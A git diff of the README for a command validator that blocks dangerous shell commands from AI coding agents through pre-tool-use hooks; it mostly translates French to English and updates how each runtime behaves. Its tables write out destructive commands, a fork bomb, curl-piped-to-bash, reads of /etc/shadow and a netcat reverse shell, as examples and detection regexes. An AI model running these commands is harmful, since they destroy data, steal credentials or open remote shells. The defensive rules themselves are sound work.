@@ -1,10 +1,10 @@
 # Command & Tool Validator
 
-Prévient l'exécution de **commandes bash destructrices ou dangereuses** et bloque l'usage d'**outils de modification** sans autorisation préalable (`/go`).
+Prevents execution of **destructive or dangerous bash commands** and blocks usage of **modification tools** without prior authorization (`/go`).
 
-Le validateur a été refactoré en deux validateurs spécialisés :
-- **BashValidator** — valide les commandes bash contre les règles de sécurité
-- **ToolPermissionValidator** — bloque les outils d'écriture/édition si `/go` n'a pas été accordé (consomme `permission-enforcer`)
+The validator has been refactored into two specialized validators:
+- **BashValidator** — validates bash commands against security rules
+- **ToolPermissionValidator** — blocks write/edit tools if `/go` has not been granted (consumes `permission-enforcer`)
 
 ## 1. Wiring — 3 interception points
 
@@ -14,28 +14,26 @@ Le validateur a été refactoré en deux validateurs spécialisés :
 | 2 | **Pre-tool-use hook** · reads stdin JSON | **Claude Code** | `~/.claude/hooks/command-validator.ts` |
 | 3 | **Pre-tool-use hook** · reads stdin JSON | **Codex** | `~/.codex/hooks/command-validator.ts` |
 
-Tous partagent la **même logique core** : `~/.agents/agent-enforcers/command-validator/`.
+All share the **same core logic**: `~/.agents/agent-enforcers/command-validator/`.
 
-**Note :** les hooks Claude/Codex ne valident actuellement que les commandes bash (`tool_name === "Bash"`).
-La validation des outils d'écriture (tool-validator) est disponible dans le core mais non câblée dans les hooks runtime.
-Le blocage des outils de modification s'appuie principalement sur la directive AGENTS.md et le skill `/go`.
+**Note:** the Claude hook only validates bash commands (`tool_name === "Bash"`). The Codex hook validates both bash commands AND restricted tools (write, edit) — the tool-validator is fully wired. In Pi, tool-validator is also wired via the extension. Blocking modification tools additionally relies on the AGENTS.md directive and the `/go` skill.
 
 ## 2. Trigger flow
 
 ```
-Outil invoqué par l'agent
+Tool invoked by agent
         │
         ▼
 ┌───────────────────────────────────────────────┐
 │  CommandValidator.validate(command, toolName)  │
 │                                                 │
 │  RESTRICTED_TOOLS.includes(toolName) ?          │
-│    ├── Oui → ToolPermissionValidator.validate() │
+│    ├── Yes → ToolPermissionValidator.validate() │
 │    │          └─ isPermissionGranted() ?         │
 │    │               ├─ true  → ✅ allow           │
-│    │               └─ false → ❌ deny (/go requis)│
+│    │               └─ false → ❌ deny (/go required)│
 │    │                                             │
-│    └── Non → BashValidator.validate(command)     │
+│    └── No → BashValidator.validate(command)      │
 │               ├─ rm -rf        → ❌ CRITICAL deny │
 │               ├─ sudo, chmod.. → ⚠️ HIGH ask      │
 │               └─ ls, git...    → ✅ allow          │
@@ -46,7 +44,7 @@ Outil invoqué par l'agent
 
 ### CRITICAL — Immediately blocked
 
-Irreversible destructive patterns (non-exhaustive) :
+Irreversible destructive patterns (non-exhaustive):
 
 | Pattern | Example | Regex |
 |---------|---------|-------|
@@ -56,13 +54,13 @@ Irreversible destructive patterns (non-exhaustive) :
 | **mkfs** | `mkfs.ext4 /dev/sda` | `mkfs\.\w+\s+\/dev\/` |
 | **shred /dev/** | `shred /dev/nvme0` | `shred\s+.*\/dev\/` |
 | **Fork bomb** | `:(){ :\|:& };:` | `fork\s+bomb\|:\(\)\s*\{` |
-| **Pipe to shell** | `curl http://x.sh \| bash` | `curl\s+.*\|\s*(sh\|bash)` |
-| **cat /etc/shadow** | `cat /etc/shadow` | `cat\s+\/etc\/(passwd\|shadow)` |
+| **Pipe to shell** | `curl http://x.sh \| bash` | `(wget\|curl)\s+.*\|\s*(sh\|bash)` |
+| **cat /etc/shadow** | `cat /etc/shadow` | `cat\s+\/etc\/(passwd\|shadow\|sudoers)` |
 | **Netcat reverse** | `nc -l -e /bin/bash` | `nc\s+.*-l.*-e` |
 
 ### HIGH — Asks for confirmation
 
-Potentially dangerous but sometimes legitimate commands :
+Potentially dangerous but sometimes legitimate commands:
 
 | Command | Risk |
 |---------|------|
@@ -76,36 +74,20 @@ Potentially dangerous but sometimes legitimate commands :
 | `mount ...` | Filesystem mounting |
 | `nmap ...` | Network scanning |
 | `iptables ...` | Firewall modification |
-| `> file` (redirect) | Writing to system files |
-| `rm ...` (no `-rf`) | File deletion |
 
-### Additional patterns in the Pi extension
+**Exception:** `chmod +x` is always allowed (making a script executable).
 
-On top of the shared validator, the Pi extension adds these destructive patterns :
+### Core security rules
 
-```typescript
-const DESTRUCTIVE_PATTERNS = [
-    />\s*\/dev\/(sda|hda|nvme)/i,
-    /dd\s+.*of=\/dev\//i,
-    /shred\s+.*\/dev\//i,
-    /mkfs\.\w+\s+\/dev\//i,
-    /rm\s+.*-rf\s*\/\s*$/i,
-    /rm\s+.*-rf\s*\/etc/i,
-    /rm\s+.*-rf\s*\/usr/i,
-    /rm\s+.*-rf\s*\/bin/i,
-    /rm\s+.*-rf\s*\/sys/i,
-    /rm\s+.*-rf\s*\/home\/[^/]*\s*$/i,
-    /fork\s+bomb|:\(\)\s*\{/i,
-    /curl\s+.*\|\s*(sh|bash)/i,
-    /wget\s+.*\|\s*(sh|bash)/i,
-    /cat\s+\/etc\/(passwd|shadow)/i,
-    />\s*\/etc\/(passwd|shadow)/i,
-    /nc\s+.*-l.*-e/i,
-    /nc\s+.*-e.*-l/i,
-];
-```
+All three runtimes share the same rules defined in `~/.agents/agent-enforcers/command-validator/src/core/security-rules.ts`:
 
-**Exception :** `chmod +x` is always allowed (making a script executable).
+- **CRITICAL_COMMANDS**: `del`, `format`, `mkfs`, `shred`, `dd`, `fdisk`, `parted`, `gparted`, `cfdisk`
+- **PRIVILEGE_COMMANDS**: `sudo`, `su`, `passwd`, `chpasswd`, `usermod`, `chmod`, `chown`, `chgrp`, `setuid`, `setgid`
+- **NETWORK_COMMANDS**: `nc`, `netcat`, `nmap`, `telnet`, `ssh-keygen`, `iptables`, `ufw`, `firewall-cmd`, `ipfw`
+- **SYSTEM_COMMANDS**: `systemctl`, `service`, `kill`, `killall`, `pkill`, `mount`, `umount`, `swapon`, `swapoff`
+- **DANGEROUS_PATTERNS**: 50+ regex patterns covering destructive writes, pipes to shell, crypto miners, docker prunes, kernel module loading, cron injection, credential dumping, Prisma destructive resets, and more
+
+The Pi extension does not add its own patterns — it imports the shared core validator directly.
 
 ## 4. Behavior by runtime
 
@@ -113,38 +95,44 @@ const DESTRUCTIVE_PATTERNS = [
 
 | Situation | Behavior |
 |-----------|----------|
-| `rm -rf /` | ❌ Block : "Destructive command blocked" + violation list |
-| `sudo apt update` | ⚠️ **UI Dialog** : `ctx.ui.confirm("Dangerous command", ...)` → if refused, block |
+| `rm -rf /` | ❌ Block: "Destructive command blocked" + violation list |
+| `sudo apt update` | ⚠️ **UI Dialog**: `ctx.ui.confirm("Dangerous command", ...)` → if refused, block |
 | `ls -la` | ✅ Passes |
 | `chmod +x script.sh` | ✅ Passes (whitelisted) |
+| Restricted tool (Write/Edit) without `/go` | ❌ Block: "Permission denied" |
 
-### Claude (Pre-tool-use hook)
+### Claude Code (Pre-tool-use hook)
 
 | Situation | Behavior |
 |-----------|----------|
-| CRITICAL or HIGH | ❌ Deny + message with command, reason, severity |
-| HIGH (with override token) | ✅ Allow if token is valid (see `override-store.ts`) |
+| CRITICAL | ❌ Deny (`permissionDecision: "deny"`) + message with command, reason, severity |
+| HIGH | ⚠️ **Ask** (`permissionDecision: "ask"`) — Claude Code prompts the user to confirm or deny |
 | allow | ✅ Passes |
+
+**Note:** the Claude hook has no override token mechanism. HIGH commands must be approved interactively via the Claude Code prompt.
 
 ### Codex (Pre-tool-use hook)
 
 | Situation | Behavior |
 |-----------|----------|
-| CRITICAL | ❌ Deny |
-| HIGH + approval token | ✅ Allow (consumeOverride) |
+| CRITICAL | ❌ Deny — process exits immediately |
+| HIGH (no token) | ❌ Deny + approval token generated — user sees `allow-command <token>` to approve |
+| HIGH + approved token | ✅ Allow via `consumeOverride()` — token is consumed (one-shot) |
 | allow | ✅ Passes |
+| Restricted tool (Write/Edit) without `/go` | ❌ Deny: "Permission denied" |
+
+**Implementation note:** for CRITICAL commands, the deny path calls `respondPreToolDeny()` which triggers `process.exit(0)`. The subsequent approval-token generation code is never reached, but the control flow is implicit (no explicit `return`). This is functionally correct but structurally brittle.
 
 ## 5. Logging
 
-Each runtime logs validation events to its own path :
+Each runtime logs validation events to its own path:
 
-| Runtime | Log path |
-|---------|----------|
-| **Pi** (extension) | `~/neelopedia/stats/pi/command-validator/events.jsonl` |
-| **Claude/Codex** (pre-tool-use hook) | `~/neelopedia/stats/agents/command-validator/events.jsonl` |
-| **Antigravity** (git hook) | `~/neelopedia/stats/antigravity/events.jsonl` (via telemetry) |
-
-Each event contains `source`, `action`, `severity`, and `violations`.
+| Runtime | Log path | Format |
+|---------|----------|--------|
+| **Pi** (extension) | `~/neelopedia/stats/pi/command-validator/` | `rawCommand`, `action`, `parentModel`, `thinkingLevel`, `toolName`, `reason` |
+| **Claude Code** (hook) | `~/neelopedia/stats/claude-code/command-validator/events.jsonl` | `timestamp`, `source`, `command`, `action`, `violations`, `severity` |
+| **Codex** (hook) | `~/neelopedia/stats/codex/command-validator/` | `rawCommand`, `action`, `parentModel`, `thinkingLevel`, `toolName`, `reason`, `severity`, `override`, `userResponse` |
+| **Antigravity** (git hook) | `~/neelopedia/stats/antigravity/events.jsonl` | Via telemetry |
 
 ## 6. File tree
 
@@ -155,21 +143,22 @@ command-validator/
         ├── types.ts                   ← ValidationResult, Severity, SecurityRules
         ├── validator.ts               ← CommandValidator — dispatches to bash or tool validator
         ├── bash-validator.ts          ← BashValidator — validates shell commands
-        ├── tool-validator.ts          ← ToolPermissionValidator — blocks write tools sans /go
+        ├── tool-validator.ts          ← ToolPermissionValidator — blocks write tools without /go
         ├── tool-rules.ts              ← RESTRICTED_TOOLS list (write, edit, etc.)
         ├── security-rules.ts          ← CRITICAL/HIGH/DANGEROUS_PATTERNS rules
         └── __tests__/validator.test.ts
 ```
 
-**Dépendance :** `tool-validator.ts` importe `isPermissionGranted` depuis `~/.agents/agent-enforcers/permission-enforcer/src/core/state.ts`.
+**Dependency:** `tool-validator.ts` imports `isPermissionGranted` from `~/.agents/agent-enforcers/permission-enforcer/src/core/state.ts`.
 
 ## 7. Agent mitigation (when blocked)
 
-1. **CRITICAL (deny) :** do not bypass. Reformulate with a more targeted approach
+1. **CRITICAL (deny):** do not bypass. Reformulate with a more targeted approach
    - `rm -rf /` → `rm -rf ./dir` or `rm file1 file2`
    - `curl ... | bash` → download first, inspect, then execute
-2. **HIGH (ask) :**
-   - **Pi :** a UI dialog appears — respond in the dialog
-   - **Codex :** the error contains a token `allow-command <token>` — ask the user to approve
-3. **Permission refusée (/go manquant) :** Si un outil d'écriture est bloqué (`ToolPermissionValidator`), demandez à l'utilisateur de taper `/go` dans son prochain message. Cela déclenchera le skill `/go` qui charge `operational-rules/implementation.md` et déverrouille l'autorisation d'implémentation.
+2. **HIGH (ask):**
+   - **Pi:** a UI dialog appears — respond in the dialog
+   - **Claude Code:** Claude Code prompts the user via `permissionDecision: "ask"` — the user confirms or denies inline
+   - **Codex:** the error contains a token `allow-command <token>` — ask the user to approve. The user must type `allow-command <token>` to call `approveToken()`, then re-run the command so `consumeOverride()` finds the approved entry.
+3. **Permission denied (/go missing):** if a write tool is blocked (`ToolPermissionValidator`), ask the user to type `/go` in their next message. This triggers the `/go` skill which loads `operational-rules/implementation.md` and unlocks implementation authorization.
 4. **Never** use obfuscation (`rm -rf /` disguised as `rm -rf $ROOT` or via `eval`)
